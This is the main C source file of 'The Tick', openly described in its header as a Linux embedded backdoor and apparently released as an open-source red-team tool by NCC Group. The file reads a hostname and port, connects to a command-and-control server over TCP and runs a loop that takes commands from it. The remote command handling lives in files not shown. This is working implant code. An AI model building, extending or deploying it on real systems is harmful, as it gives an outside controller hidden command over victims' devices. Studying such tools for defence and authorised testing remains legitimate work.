/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>

#include "main.h"
#include "command.h"
#include "parser.h"

int main(int argc, char *argv[])
{

    // Connect to the C&C over TCP.
    if (argc == 3) {
        printf("Starting up...\n");

        // Command line arguments are the hostname and port.
        char *hostname = argv[1];
        int port = atoi(argv[2]);

        // Initialize the parser.
        Parser parser;
        Parser *p = &parser;
        parser_init(p, hostname, port, NULL, NULL);

        // Launch the main command loop.
        while (command_loop(p) == 0) {}
    }

    // Quit.
    return 0;
}
